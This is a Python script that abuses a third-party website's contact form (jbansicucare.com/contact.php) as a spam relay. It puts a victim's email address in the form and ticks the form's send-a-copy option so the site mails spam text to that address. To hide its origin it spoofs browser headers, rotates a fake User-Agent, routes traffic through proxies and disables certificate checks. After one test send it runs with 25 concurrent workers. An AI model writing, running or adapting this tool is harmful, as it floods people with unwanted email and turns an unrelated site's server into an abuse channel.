from os.path import basename

import requests
from faker import Faker

import module


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response:
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Origin': 'http://jbansicucare.com',
            'Referer': 'http://jbansicucare.com/contact.php',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': Faker().chrome(),
        }

        text = self.get_text()
        data = {
            'name': 'name',
            'email': target,
            'phone': '123512521',
            'subject': text,
            'message': text,
            'yourself': 'on',
            'Submit': 'Send Email',
        }

        response = requests.post('http://jbansicucare.com/contact.php', headers=headers, data=data, verify=False,
                                 proxies=self.get_proxies())
        return response


def main():
    project_name = basename(__file__)[:-3]
    spam = ConcreteSpam(
        project_name, proxy_pool_name='parsed'
    )
    res = spam.send_post('wezxasqw@1secmail.com')
    if res:
        spam.run_concurrently(25)


if __name__ == '__main__':
    main()
